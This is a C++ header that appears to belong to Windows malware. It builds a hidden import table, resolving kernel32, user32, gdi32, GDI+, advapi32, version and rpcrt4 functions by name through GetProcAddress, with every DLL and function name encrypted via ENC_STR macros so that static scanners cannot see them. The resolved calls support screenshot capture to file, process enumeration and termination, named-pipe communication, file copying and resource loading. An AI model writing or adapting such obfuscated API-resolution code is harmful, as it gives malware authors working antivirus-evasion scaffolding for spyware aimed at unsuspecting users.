#pragma once
#include <Windows.h>
#include <ShlObj.h>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <Rpc.h>
#include "secure_string.hpp"

namespace api {
    // Kernel32.dll functions
    HMODULE (WINAPI* pLoadLibraryW)(LPCWSTR) = nullptr;
    FARPROC (WINAPI* pGetProcAddress)(HMODULE, LPCSTR) = nullptr;
    HMODULE (WINAPI* pGetModuleHandleW)(LPCWSTR) = nullptr;
    DWORD (WINAPI* pGetModuleFileNameW)(HMODULE, LPWSTR, DWORD) = nullptr;
    BOOL (WINAPI* pCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES) = nullptr;
    BOOL (WINAPI* pCreateDirectoryW)(LPCWSTR, LPSECURITY_ATTRIBUTES) = nullptr;
    BOOL (WINAPI* pCopyFileA)(LPCSTR, LPCSTR, BOOL) = nullptr;
    BOOL (WINAPI* pCopyFileW)(LPCWSTR, LPCWSTR, BOOL) = nullptr;
    BOOL (WINAPI* pDeleteFileW)(LPCWSTR) = nullptr;
    DWORD (WINAPI* pGetTempPathW)(DWORD, LPWSTR) = nullptr;
    DWORD (WINAPI* pGetEnvironmentVariableW)(LPCWSTR, LPWSTR, DWORD) = nullptr;
    BOOL (WINAPI* pGetUserNameA)(LPSTR, LPDWORD) = nullptr;
    BOOL (WINAPI* pGetUserNameW)(LPWSTR, LPDWORD) = nullptr;
    VOID (WINAPI* pSleep)(DWORD) = nullptr;
    DWORD (WINAPI* pGetTickCount)(VOID) = nullptr;
    BOOL (WINAPI* pCloseHandle)(HANDLE) = nullptr;
    HANDLE (WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD) = nullptr;
    BOOL (WINAPI* pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W) = nullptr;
    BOOL (WINAPI* pProcess32NextW)(HANDLE, LPPROCESSENTRY32W) = nullptr;
    HANDLE (WINAPI* pOpenProcess)(DWORD, BOOL, DWORD) = nullptr;
    BOOL (WINAPI* pIsWow64Process)(HANDLE, PBOOL) = nullptr;
    BOOL (WINAPI* pTerminateProcess)(HANDLE, UINT) = nullptr;
    BOOL (WINAPI* pCreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION) = nullptr;
    HANDLE (WINAPI* pCreateNamedPipeW)(LPCWSTR, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, LPSECURITY_ATTRIBUTES) = nullptr;
    BOOL (WINAPI* pConnectNamedPipe)(HANDLE, LPOVERLAPPED) = nullptr;
    BOOL (WINAPI* pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED) = nullptr;
    BOOL (WINAPI* pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED) = nullptr;
    BOOL (WINAPI* pPeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD) = nullptr;
    DWORD (WINAPI* pGetLastError)(VOID) = nullptr;
    DWORD (WINAPI* pWaitForSingleObject)(HANDLE, DWORD) = nullptr;

    // Shell32.dll functions
    HRESULT (WINAPI* pSHGetFolderPathW)(HWND, int, HANDLE, DWORD, LPWSTR) = nullptr;

    // User32.dll functions
    HANDLE (WINAPI* pGetStdHandle)(DWORD) = nullptr;
    BOOL (WINAPI* pSetConsoleTextAttribute)(HANDLE, WORD) = nullptr;
    BOOL (WINAPI* pGetConsoleScreenBufferInfo)(HANDLE, PCONSOLE_SCREEN_BUFFER_INFO) = nullptr;
    HDC (WINAPI* pGetDC)(HWND) = nullptr;
    int (WINAPI* pReleaseDC)(HWND, HDC) = nullptr;
    int (WINAPI* pGetSystemMetrics)(int) = nullptr;

    // GDI32.dll functions
    HDC (WINAPI* pCreateCompatibleDC)(HDC) = nullptr;
    HBITMAP (WINAPI* pCreateCompatibleBitmap)(HDC, int, int) = nullptr;
    HGDIOBJ (WINAPI* pSelectObject)(HDC, HGDIOBJ) = nullptr;
    BOOL (WINAPI* pBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD) = nullptr;
    BOOL (WINAPI* pDeleteDC)(HDC) = nullptr;
    BOOL (WINAPI* pDeleteObject)(HGDIOBJ) = nullptr;

    // GDI+ functions
    Gdiplus::Status (WINAPI* pGdiplusStartup)(ULONG_PTR*, const Gdiplus::GdiplusStartupInput*, Gdiplus::GdiplusStartupOutput*) = nullptr;
    void (WINAPI* pGdiplusShutdown)(ULONG_PTR) = nullptr;
    Gdiplus::Status (WINAPI* pGdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, Gdiplus::GpBitmap**) = nullptr;
    Gdiplus::Status (WINAPI* pGdipSaveImageToFile)(Gdiplus::GpImage*, const WCHAR*, const CLSID*, const Gdiplus::EncoderParameters*) = nullptr;
    Gdiplus::Status (WINAPI* pGdipDisposeImage)(Gdiplus::GpImage*) = nullptr;

    // Version.dll functions
    DWORD (WINAPI* pGetFileVersionInfoSizeW)(LPCWSTR, LPDWORD) = nullptr;
    BOOL (WINAPI* pGetFileVersionInfoW)(LPCWSTR, DWORD, DWORD, LPVOID) = nullptr;
    BOOL (WINAPI* pVerQueryValueW)(LPCVOID, LPCWSTR, LPVOID*, PUINT) = nullptr;

    // Resource functions
    HRSRC (WINAPI* pFindResourceW)(HMODULE, LPCWSTR, LPCWSTR) = nullptr;
    HGLOBAL (WINAPI* pLoadResource)(HMODULE, HRSRC) = nullptr;
    LPVOID (WINAPI* pLockResource)(HGLOBAL) = nullptr;
    DWORD (WINAPI* pSizeofResource)(HMODULE, HRSRC) = nullptr;

    // RPC functions
    RPC_STATUS (RPC_ENTRY* pUuidCreate)(UUID*) = nullptr;
    RPC_STATUS (RPC_ENTRY* pUuidToStringW)(UUID*, RPC_WSTR*) = nullptr;
    RPC_STATUS (RPC_ENTRY* pRpcStringFreeW)(RPC_WSTR*) = nullptr;

    bool Initialize() {
        HMODULE kernel32 = ::GetModuleHandleW(ENC_WSTR(L"kernel32.dll"));
        if (!kernel32) return false;

        pGetProcAddress = reinterpret_cast<decltype(pGetProcAddress)>(::GetProcAddress(kernel32, ENC_STR("GetProcAddress")));
        if (!pGetProcAddress) return false;
        
        pLoadLibraryW = reinterpret_cast<decltype(pLoadLibraryW)>(pGetProcAddress(kernel32, ENC_STR("LoadLibraryW")));
        if (!pLoadLibraryW) return false;

        HMODULE advapi32 = pLoadLibraryW(ENC_WSTR(L"advapi32.dll"));
        HMODULE shell32 = pLoadLibraryW(ENC_WSTR(L"shell32.dll"));
        HMODULE user32 = pLoadLibraryW(ENC_WSTR(L"user32.dll"));
        HMODULE gdi32 = pLoadLibraryW(ENC_WSTR(L"gdi32.dll"));
        HMODULE gdiplus = pLoadLibraryW(ENC_WSTR(L"gdiplus.dll"));
        HMODULE version = pLoadLibraryW(ENC_WSTR(L"version.dll"));
        HMODULE rpcrt4 = pLoadLibraryW(ENC_WSTR(L"rpcrt4.dll"));

        if (!advapi32 || !shell32 || !user32 || !gdi32 || !gdiplus || !version || !rpcrt4) {
            return false;
        }

        // Load kernel32 functions
        pGetModuleHandleW = reinterpret_cast<decltype(pGetModuleHandleW)>(pGetProcAddress(kernel32, ENC_STR("GetModuleHandleW")));
        pCreateDirectoryA = reinterpret_cast<decltype(pCreateDirectoryA)>(pGetProcAddress(kernel32, ENC_STR("CreateDirectoryA")));
        pCopyFileA = reinterpret_cast<decltype(pCopyFileA)>(pGetProcAddress(kernel32, ENC_STR("CopyFileA")));
        pGetEnvironmentVariableW = reinterpret_cast<decltype(pGetEnvironmentVariableW)>(pGetProcAddress(kernel32, ENC_STR("GetEnvironmentVariableW")));
        pGetTempPathW = reinterpret_cast<decltype(pGetTempPathW)>(pGetProcAddress(kernel32, ENC_STR("GetTempPathW")));
        pDeleteFileW = reinterpret_cast<decltype(pDeleteFileW)>(pGetProcAddress(kernel32, ENC_STR("DeleteFileW")));
        pCreateDirectoryW = reinterpret_cast<decltype(pCreateDirectoryW)>(pGetProcAddress(kernel32, ENC_STR("CreateDirectoryW")));
        pCopyFileW = reinterpret_cast<decltype(pCopyFileW)>(pGetProcAddress(kernel32, ENC_STR("CopyFileW")));
        pGetModuleFileNameW = reinterpret_cast<decltype(pGetModuleFileNameW)>(pGetProcAddress(kernel32, ENC_STR("GetModuleFileNameW")));
        pCreateToolhelp32Snapshot = reinterpret_cast<decltype(pCreateToolhelp32Snapshot)>(pGetProcAddress(kernel32, ENC_STR("CreateToolhelp32Snapshot")));
        pProcess32FirstW = reinterpret_cast<decltype(pProcess32FirstW)>(pGetProcAddress(kernel32, ENC_STR("Process32FirstW")));
        pProcess32NextW = reinterpret_cast<decltype(pProcess32NextW)>(pGetProcAddress(kernel32, ENC_STR("Process32NextW")));
        pOpenProcess = reinterpret_cast<decltype(pOpenProcess)>(pGetProcAddress(kernel32, ENC_STR("OpenProcess")));
        pCreateProcessW = reinterpret_cast<decltype(pCreateProcessW)>(pGetProcAddress(kernel32, ENC_STR("CreateProcessW")));
        pTerminateProcess = reinterpret_cast<decltype(pTerminateProcess)>(pGetProcAddress(kernel32, ENC_STR("TerminateProcess")));
        pCreateNamedPipeW = reinterpret_cast<decltype(pCreateNamedPipeW)>(pGetProcAddress(kernel32, ENC_STR("CreateNamedPipeW")));
        pConnectNamedPipe = reinterpret_cast<decltype(pConnectNamedPipe)>(pGetProcAddress(kernel32, ENC_STR("ConnectNamedPipe")));
        pPeekNamedPipe = reinterpret_cast<decltype(pPeekNamedPipe)>(pGetProcAddress(kernel32, ENC_STR("PeekNamedPipe")));
        pReadFile = reinterpret_cast<decltype(pReadFile)>(pGetProcAddress(kernel32, ENC_STR("ReadFile")));
        pWriteFile = reinterpret_cast<decltype(pWriteFile)>(pGetProcAddress(kernel32, ENC_STR("WriteFile")));
        pCloseHandle = reinterpret_cast<decltype(pCloseHandle)>(pGetProcAddress(kernel32, ENC_STR("CloseHandle")));
        pWaitForSingleObject = reinterpret_cast<decltype(pWaitForSingleObject)>(pGetProcAddress(kernel32, ENC_STR("WaitForSingleObject")));
        pSleep = reinterpret_cast<decltype(pSleep)>(pGetProcAddress(kernel32, ENC_STR("Sleep")));
        pGetTickCount = reinterpret_cast<decltype(pGetTickCount)>(pGetProcAddress(kernel32, ENC_STR("GetTickCount")));
        pGetLastError = reinterpret_cast<decltype(pGetLastError)>(pGetProcAddress(kernel32, ENC_STR("GetLastError")));
        pFindResourceW = reinterpret_cast<decltype(pFindResourceW)>(pGetProcAddress(kernel32, ENC_STR("FindResourceW")));
        pLoadResource = reinterpret_cast<decltype(pLoadResource)>(pGetProcAddress(kernel32, ENC_STR("LoadResource")));
        pLockResource = reinterpret_cast<decltype(pLockResource)>(pGetProcAddress(kernel32, ENC_STR("LockResource")));
        pSizeofResource = reinterpret_cast<decltype(pSizeofResource)>(pGetProcAddress(kernel32, ENC_STR("SizeofResource")));
        pIsWow64Process = reinterpret_cast<decltype(pIsWow64Process)>(pGetProcAddress(kernel32, ENC_STR("IsWow64Process")));
        
        // Load advapi32 functions
        pGetUserNameW = reinterpret_cast<decltype(pGetUserNameW)>(pGetProcAddress(advapi32, ENC_STR("GetUserNameW")));
        pGetUserNameA = reinterpret_cast<decltype(pGetUserNameA)>(pGetProcAddress(advapi32, ENC_STR("GetUserNameA")));

        // Load shell32 functions
        pSHGetFolderPathW = reinterpret_cast<decltype(pSHGetFolderPathW)>(pGetProcAddress(shell32, ENC_STR("SHGetFolderPathW")));

        // Load user32 functions
        pGetSystemMetrics = reinterpret_cast<decltype(pGetSystemMetrics)>(pGetProcAddress(user32, ENC_STR("GetSystemMetrics")));
        pGetDC = reinterpret_cast<decltype(pGetDC)>(pGetProcAddress(user32, ENC_STR("GetDC")));
        pReleaseDC = reinterpret_cast<decltype(pReleaseDC)>(pGetProcAddress(user32, ENC_STR("ReleaseDC")));
        pGetStdHandle = reinterpret_cast<decltype(pGetStdHandle)>(pGetProcAddress(kernel32, ENC_STR("GetStdHandle")));
        pSetConsoleTextAttribute = reinterpret_cast<decltype(pSetConsoleTextAttribute)>(pGetProcAddress(kernel32, ENC_STR("SetConsoleTextAttribute")));
        pGetConsoleScreenBufferInfo = reinterpret_cast<decltype(pGetConsoleScreenBufferInfo)>(pGetProcAddress(kernel32, ENC_STR("GetConsoleScreenBufferInfo")));

        // Load gdi32 functions
        pCreateCompatibleDC = reinterpret_cast<decltype(pCreateCompatibleDC)>(pGetProcAddress(gdi32, ENC_STR("CreateCompatibleDC")));
        pCreateCompatibleBitmap = reinterpret_cast<decltype(pCreateCompatibleBitmap)>(pGetProcAddress(gdi32, ENC_STR("CreateCompatibleBitmap")));
        pSelectObject = reinterpret_cast<decltype(pSelectObject)>(pGetProcAddress(gdi32, ENC_STR("SelectObject")));
        pBitBlt = reinterpret_cast<decltype(pBitBlt)>(pGetProcAddress(gdi32, ENC_STR("BitBlt")));
        pDeleteObject = reinterpret_cast<decltype(pDeleteObject)>(pGetProcAddress(gdi32, ENC_STR("DeleteObject")));
        pDeleteDC = reinterpret_cast<decltype(pDeleteDC)>(pGetProcAddress(gdi32, ENC_STR("DeleteDC")));

        // Load gdiplus functions
        pGdiplusStartup = reinterpret_cast<decltype(pGdiplusStartup)>(pGetProcAddress(gdiplus, ENC_STR("GdiplusStartup")));
        pGdiplusShutdown = reinterpret_cast<decltype(pGdiplusShutdown)>(pGetProcAddress(gdiplus, ENC_STR("GdiplusShutdown")));
        pGdipCreateBitmapFromHBITMAP = reinterpret_cast<decltype(pGdipCreateBitmapFromHBITMAP)>(pGetProcAddress(gdiplus, ENC_STR("GdipCreateBitmapFromHBITMAP")));
        pGdipSaveImageToFile = reinterpret_cast<decltype(pGdipSaveImageToFile)>(pGetProcAddress(gdiplus, ENC_STR("GdipSaveImageToFile")));
        pGdipDisposeImage = reinterpret_cast<decltype(pGdipDisposeImage)>(pGetProcAddress(gdiplus, ENC_STR("GdipDisposeImage")));

        // Load version functions
        pGetFileVersionInfoSizeW = reinterpret_cast<decltype(pGetFileVersionInfoSizeW)>(pGetProcAddress(version, ENC_STR("GetFileVersionInfoSizeW")));
        pGetFileVersionInfoW = reinterpret_cast<decltype(pGetFileVersionInfoW)>(pGetProcAddress(version, ENC_STR("GetFileVersionInfoW")));
        pVerQueryValueW = reinterpret_cast<decltype(pVerQueryValueW)>(pGetProcAddress(version, ENC_STR("VerQueryValueW")));

        // Load rpcrt4 functions
        pUuidCreate = reinterpret_cast<decltype(pUuidCreate)>(pGetProcAddress(rpcrt4, ENC_STR("UuidCreate")));
        pUuidToStringW = reinterpret_cast<decltype(pUuidToStringW)>(pGetProcAddress(rpcrt4, ENC_STR("UuidToStringW")));
        pRpcStringFreeW = reinterpret_cast<decltype(pRpcStringFreeW)>(pGetProcAddress(rpcrt4, ENC_STR("RpcStringFreeW")));

        return true;
    }
} 